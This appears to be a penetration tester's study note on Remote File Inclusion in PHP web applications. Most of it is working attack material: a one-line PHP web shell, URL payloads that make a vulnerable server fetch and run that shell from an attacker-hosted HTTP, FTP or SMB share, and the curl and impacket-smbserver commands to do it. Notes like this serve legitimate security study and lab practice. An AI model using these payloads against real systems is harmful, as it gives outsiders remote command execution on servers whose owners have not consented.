# Remote File Inclusion (RFI)

* \
  The vulnerable function allows the inclusion of remote URLs. This allows two main benefits:
  1. Enumerating local-only ports and web applications (i.e. SSRF)
  2. Gaining remote code execution by including a malicious script that we host
* Almost any Remote File Inclusion vulnerability is also an [Local File Inclusion (LFI)](app://obsidian.md/Local%20File%20Inclusion%20\(LFI\)) vulnerability, as any function that allows including remote URLs usually also allows including local ones
  * an LFI may not necessarily be an RFI.
    * The vulnerable function may not allow including remote URLs
    * You may only control a portion of the filename and not the entire protocol wrapper (ex: `http://`, `ftp://`, `https://`).
    * The configuration may prevent RFI altogether, as most modern web servers disable including remote files by default

```
http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
```

### Remote Code Execution with RFI

```shell-session
 echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

* start a [Personal web server](app://obsidian.md/Personal%20web%20server)

```
http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
```

#### FTP

* if FTP is blocked use FTP server
  * setup ftp server [Setup FTP Server](app://obsidian.md/Personal%20web%20server#FTP%20Server)

```
http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
```

* cli version

```shell-session
 curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
```

#### SMB

*   if a windows web server is being used

    ```shell-session
    impacket-smbserver -smb2support share $(pwd)
    ```

```
http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
```
